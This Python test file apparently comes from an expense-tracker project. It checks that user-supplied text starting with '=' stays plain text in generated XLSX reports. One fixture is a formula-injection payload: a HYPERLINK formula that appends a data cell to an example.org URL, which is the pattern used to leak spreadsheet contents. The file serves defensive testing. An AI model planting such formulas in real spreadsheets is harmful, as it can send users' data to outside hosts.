"""Statement text in the spreadsheet reports.

Descriptions come from bank statements and notes from the user: whatever
they contain, they are data. They must reach the cells as text and must
not change the formulas that mention them.
"""
from __future__ import annotations

import pytest
from odf.opendocument import load as load_ods
from odf.table import Table, TableCell, TableRow
from odf.text import P
from openpyxl import load_workbook

from expense_tracker.ods import generate_ods
from expense_tracker.xlsx import generate_xlsx

from .conftest import add_transaction

FORMULA = '=HYPERLINK("http://example.org/?"&Data!F2,"click")'


def _xlsx(db, tmp_path):
    path = tmp_path / "report.xlsx"
    generate_xlsx(db, tmp_path / "rules.csv", path, tmp_path / "notes.csv")
    return load_workbook(path)


def _xlsx_row(ws, label: str) -> int:
    for row in ws.iter_rows(min_col=1, max_col=1):
        if row[0].value == label:
            return row[0].row
    raise AssertionError(f"{label!r} not found in {ws.title}")


def _ods(db, tmp_path):
    path = tmp_path / "report.ods"
    generate_ods(db, tmp_path / "rules.csv", path, tmp_path / "notes.csv")
    return load_ods(str(path))


def _ods_cells(doc, sheet_name: str, label: str) -> list:
    sheet = next(
        s
        for s in doc.spreadsheet.getElementsByType(Table)
        if s.getAttribute("name") == sheet_name
    )
    for row in sheet.getElementsByType(TableRow):
        cells = row.getElementsByType(TableCell)
        if cells and "".join(str(p) for p in cells[0].getElementsByType(P)) == label:
            return cells
    raise AssertionError(f"{label!r} not found in {sheet_name}")


class TestXlsxCellsHoldText:
    """openpyxl stores any string that starts with "=" as a formula."""

    @pytest.fixture
    def workbook(self, test_db, tmp_path):
        add_transaction(
            test_db, "2026-01-10", FORMULA, 10.0, category="=Misc", notes="=1+1"
        )
        (tmp_path / "rules.csv").write_text(
            "pattern,match_field,category,subcategory,payment_type\n"
            "=SHOP,description,=Misc,,\n",
            encoding="utf-8",
        )
        return _xlsx(test_db, tmp_path)

    def test_description_and_notes_are_text(self, workbook):
        ws = workbook["Data"]
        for column in ("D", "E", "H", "R"):  # raw, clean, category, notes
            cell = ws[f"{column}2"]
            assert cell.data_type == "s", f"{column}2 is a formula: {cell.value}"
        assert ws["E2"].value == FORMULA
        assert ws["R2"].value == "=1+1"

    def test_rule_pattern_is_text(self, workbook):
        cell = workbook["Rules"]["A2"]
        assert (cell.data_type, cell.value) == ("s", "=SHOP")

    @pytest.mark.parametrize(
        "sheet, label",
        [
            ("Dashboard", "=Misc"),
            ("Dashboard", FORMULA),
            ("Category Breakdown", "=Misc"),
            ("Subcategory Breakdown", "=Misc"),
        ],
    )
    def test_labels_of_analysis_sheets_are_text(self, workbook, sheet, label):
        ws = workbook[sheet]
        assert ws.cell(row=_xlsx_row(ws, label), column=1).data_type == "s"

    def test_category_heading_of_monthly_summary_is_text(self, workbook):
        cell = workbook["Monthly Summary"]["B1"]
        assert (cell.data_type, cell.value) == ("s", "=Misc")

